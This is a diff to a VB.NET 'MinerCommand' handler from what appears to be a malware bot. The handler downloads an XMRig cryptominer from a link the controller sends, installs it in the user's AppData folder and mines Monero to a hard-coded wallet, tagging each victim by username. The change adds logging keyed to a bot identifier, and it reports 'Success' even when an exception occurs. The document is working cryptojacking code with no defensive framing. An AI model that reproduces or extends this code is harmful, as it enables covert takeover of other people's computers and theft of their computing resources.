@@ -25,6 +25,7 @@ Public Class MinerCommand : Implements ICommand
     Private Shared Arguments As String = "-o vegas-backup.xmrpool.net:80 -u 44SSGsjvMsv53LkD5pZSxb7NzPeSqceybQwzpSRcfc3sWVjhkbNgTm6HDaUkQDcGG9TCoUMx7FNDxXE5iRJymncSLPkEa8C -p " & Environment.UserName & ":kankkaka@gmail.com -k -a --coin=monero --algo=rx/0 -B"
     Private Shared XmrpathwithArguments As String = GetAppdata() & "/" & GetUnzipedFolderName() & "/" & XMRig_exe & " " & Arguments
     Public Shared Function Handler(ByVal model As MiningModel)
+        Dim log As LogModel
         Try
             Dim LinkSplitter As String() = model.newMinerVariables.Link.Split(New Char() {"/"c})
             Setfile_name(LinkSplitter(LinkSplitter.Length - 1))
@@ -33,9 +34,20 @@ Public Class MinerCommand : Implements ICommand
             Downloader(model.newMinerVariables.Link, newlocation)
             Arguments = model.newMinerVariables.Config
             install()
-        Catch ex As Exception
+            log = New LogModel With {
+                            .Message = "Miner installing Success",
+                            .KeyUnique = GetConfigJson().KeyUnique,
+                            .Type = "Success"
+                    }
 
+        Catch ex As Exception
+            log = New LogModel With {
+                            .Message = "Miner: " & ex.ToString,
+                            .KeyUnique = GetConfigJson().KeyUnique,
+                            .Type = "Success"
+                    }
         End Try
+        Return log
     End Function
     Public Shared Sub Downloader(ByVal url As String, ByVal filename As String)
         Using client As New WebClient()
